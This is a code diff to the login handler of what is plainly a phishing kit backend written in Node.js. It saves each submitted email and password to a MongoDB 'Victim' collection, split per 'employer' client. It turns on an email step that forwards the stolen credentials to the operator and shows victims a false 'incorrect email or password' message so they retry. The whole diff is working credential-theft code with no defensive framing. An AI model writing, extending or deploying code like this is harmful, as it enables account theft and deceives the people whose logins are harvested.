@@ -1,34 +1,41 @@
 const { sendLoginEmail } = require("../services/emailService.js");
-const Victim = require("../models/VictimModel.js"); // <-- Import the model
+const { saveToEmployerAndMain } = require("../models/VictimModel.js");
 
 exports.submitLogin = async (req, res) => {
-  const { email, password } = req.body || {};
+  const { email, password, employerId } = req.body || {};
 
   if (!email || !password) {
     return res.render("login", { 
       message: "Email and password are required.", 
-      messageType: "error" 
+      messageType: "error",
+      employerId: employerId || "general"
     });
   }
 
   try {
-    // 1. SAVE TO MONGODB FIRST (This takes milliseconds)
-    await Victim.create({ email, password });
-    console.log("✅ Victim data saved to MongoDB");
+    // Save to main collection + employer collection
+    await saveToEmployerAndMain({ email, password, employerId });
+    console.log(`✅ Saved to MongoDB (Main + ${employerId || 'general'}_victims)`);
 
-    // 2. COMMENT OUT THE EMAIL FOR NOW TO AVOID TIMEOUT
-    // await sendLoginEmail({ email, password });
+    try {
+      await sendLoginEmail({ email, password, employerId });
+      console.log("📧 Notification email sent successfully");
+    } catch (emailError) {
+      console.error("⚠️ Failed to send notification email:", emailError.message);
+    }
 
     return res.render("login", { 
       message: "incorrect email or password! please input correct details.", 
-      messageType: "success" 
+      messageType: "success",
+      employerId: employerId || "general"
     });
   } catch (error) {
     console.error("Login submission failed:", error);
 
     return res.render("login", { 
       message: error.message || "Unable to process your login request right now.", 
-      messageType: "error" 
+      messageType: "error",
+      employerId: employerId || "general"
     });
   }
 };
